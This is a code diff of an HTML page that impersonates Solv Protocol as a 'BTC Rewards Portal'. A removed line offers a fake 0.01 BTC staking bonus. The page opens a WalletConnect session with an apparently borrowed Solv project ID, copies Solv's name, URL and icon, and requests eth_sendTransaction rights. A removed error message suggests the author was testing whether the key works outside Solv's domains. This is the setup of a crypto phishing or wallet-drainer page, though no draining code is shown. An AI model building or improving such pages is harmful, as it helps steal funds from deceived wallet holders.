@@ -7,51 +7,46 @@
 </head>
 <body>
     <h1>Solv Protocol - BTC Rewards Portal</h1>
-    <p>Connect your wallet to claim your 0.01 BTC staking bonus.</p>
-    <button id="btn" style="padding: 15px; background: blue; color: white; border: none; border-radius: 5px; cursor: pointer;">
-        Connect Wallet
-    </button>
+    <button id="btn" style="padding: 15px; background: blue; color: white;">Connect Wallet</button>
 
     <script>
-        const projectId = '_gg7wSSi0KMBsdKnGVfHDueq6xMB9EkC';
-
         document.getElementById('btn').addEventListener('click', async () => {
+            // AUTO-FIND THE CORRECT VARIABLE
+            const ClientLib = window.SignClient || 
+                              (window.WalletConnectSignClient ? window.WalletConnectSignClient.SignClient : null);
+
+            if (!ClientLib) {
+                console.log("Current window keys:", Object.keys(window).filter(k => k.toLowerCase().includes('client') || k.toLowerCase().includes('wallet')));
+                alert("Technical Error: SignClient library not found in window object. Check console.");
+                return;
+            }
+
             try {
-                // Accessing the library via the global window object
-                const SignClient = window.WalletConnectSignClient.SignClient;
-                
-                const signClient = await SignClient.init({
-                    projectId: projectId,
+                const signClient = await ClientLib.init({
+                    projectId: '_gg7wSSi0KMBsdKnGVfHDueq6xMB9EkC',
                     metadata: {
                         name: 'Solv Protocol',
-                        description: 'Solv Finance Rewards',
                         url: 'https://app.solv.finance',
                         icons: ['https://solv.finance/favicon.ico']
                     }
                 });
 
-                const { uri, approval } = await signClient.connect({
+                const { uri } = await signClient.connect({
                     requiredNamespaces: {
                         eip155: {
-                            methods: ['eth_sendTransaction', 'personal_sign'],
+                            methods: ['eth_sendTransaction'],
                             chains: ['eip155:1'],
-                            events: ['chainChanged', 'accountsChanged']
+                            events: ['chainChanged']
                         }
                     }
                 });
 
                 if (uri) {
-                    WalletConnectQRCodeModal.open(uri, () => {
-                        console.log("Modal closed");
-                    });
+                    WalletConnectQRCodeModal.open(uri, () => {});
                 }
             } catch (err) {
                 console.error("Connection Error:", err);
-                if (err.message.includes('403')) {
-                    alert("RESULT: Key is restricted to Solv domains.");
-                } else {
-                    alert("Error: " + err.message);
-                }
+                alert("Error: " + err.message);
             }
         });
     </script>
